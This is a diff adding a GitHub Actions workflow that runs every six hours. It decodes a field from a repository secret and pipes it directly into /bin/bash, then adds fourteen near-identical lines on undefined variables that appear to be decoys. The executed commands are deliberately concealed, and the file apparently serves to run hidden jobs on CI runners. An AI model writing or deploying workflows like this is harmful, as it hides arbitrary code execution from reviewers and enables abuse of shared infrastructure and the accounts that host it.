@@ -1,0 +1,31 @@
+name: qiaofengzhong7171
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaofengzhong7171
+        env:
+          e64: ${{ secrets.e64 }}
+        run: |
+          echo $e64 | jq -r .qyjo650 | /bin/bash
+          echo $dlvu5 | jq -r .vv942 | /bin/bash
+          echo $oupz7 | jq -r .bfhn2 | /bin/bash
+          echo $awe4 | jq -r .yu0 | /bin/bash
+          echo $dir65 | jq -r .xx6 | /bin/bash
+          echo $ocdzq5176 | jq -r .vk97211 | /bin/bash
+          echo $ckg01 | jq -r .p5209 | /bin/bash
+          echo $vgldf727 | jq -r .cv76419 | /bin/bash
+          echo $dv5 | jq -r .xgomb10030 | /bin/bash
+          echo $howyj6050 | jq -r .qiok215 | /bin/bash
+          echo $smwoz48 | jq -r .w3573 | /bin/bash
+          echo $nklii879 | jq -r .x393 | /bin/bash
+          echo $plvwz174 | jq -r .ico935 | /bin/bash
+          echo $nx79884 | jq -r .squm74 | /bin/bash
+          echo $hed64939 | jq -r .nb2236 | /bin/bash
+
